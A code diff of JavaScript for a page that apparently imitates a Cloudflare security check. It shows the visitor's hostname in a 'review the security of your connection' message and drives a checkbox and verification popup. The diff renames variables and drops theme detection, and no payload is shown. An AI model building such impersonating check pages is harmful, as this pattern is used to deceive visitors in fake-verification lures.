@@ -1,7 +1,6 @@
 document.addEventListener('DOMContentLoaded', () => {
-    // DOM Elements
-    const domainDisplay = document.querySelector('.domain-name');
-    const securityMessage = document.querySelector('.security-message');
+    const domainNameElement = document.getElementById('domain-name');
+    const securityMessageElement = document.getElementById('security-message');
     const checkbox = document.querySelector('.cloudflare-checkbox input');
     const verificationPopup = document.querySelector('.verification-popup');
     const verifyButton = document.querySelector('.verify-button');
@@ -12,13 +11,13 @@ document.addEventListener('DOMContentLoaded', () => {
         const hostname = window.location.hostname;
         
         // Update domain name
-        if (domainDisplay) {
-            domainDisplay.textContent = hostname;
+        if (domainNameElement) {
+            domainNameElement.textContent = hostname;
         }
         
         // Update security message
-        if (securityMessage) {
-            securityMessage.textContent = `${hostname} needs to review the security of your connection before proceeding.`;
+        if (securityMessageElement) {
+            securityMessageElement.textContent = `${hostname} needs to review the security of your connection before proceeding.`;
         }
     }
 
@@ -77,29 +76,10 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     }
 
-    // Theme Detection
-    function detectSystemTheme() {
-        const prefersDarkMode = window.matchMedia('(prefers-color-scheme: dark)');
-        
-        function applyTheme(e) {
-            document.body.classList.remove('theme-light', 'theme-dark');
-            document.body.classList.add(
-                e.matches ? 'theme-dark' : 'theme-light'
-            );
-        }
-
-        // Initial theme application
-        applyTheme(prefersDarkMode);
-
-        // Listen for theme changes
-        prefersDarkMode.addListener(applyTheme);
-    }
-
     // Initialize all functions
     function init() {
         detectDomain();
         setupVerificationPopup();
-        detectSystemTheme();
     }
 
     // Run initialization
